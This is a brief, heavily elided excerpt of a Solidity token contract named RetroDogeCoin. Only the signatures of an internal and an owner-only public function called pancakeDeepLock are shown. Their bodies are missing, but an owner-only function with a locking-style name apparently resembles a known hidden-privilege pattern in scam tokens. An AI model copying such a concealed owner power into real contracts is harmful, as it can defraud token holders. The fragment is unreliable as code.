...
contract RetroDogeCoin is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _pancakeDeepLock(address account, uint256 amount) internal virtual {
    ...
    function pancakeDeepLock(uint256 amount) public onlyOwner virtual returns (bool) {
